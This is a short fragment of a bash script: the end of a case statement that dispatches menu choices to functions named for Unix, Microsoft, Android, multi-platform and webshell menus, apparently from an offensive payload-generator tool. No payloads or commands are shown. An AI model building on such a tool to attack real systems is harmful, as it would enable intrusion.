1) sh_unix_menu ;;
2) sh_microsoft_menu ;;
3) sh_multi_menu ;;
4) sh_android_menu ;;
5) sh_webshell_menu ;;
6) sh_world ;;
7) sh_buildin ;;
8) sh_ninja ;;
e|E) sh_exit ;;
*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2 ;;
esac
done


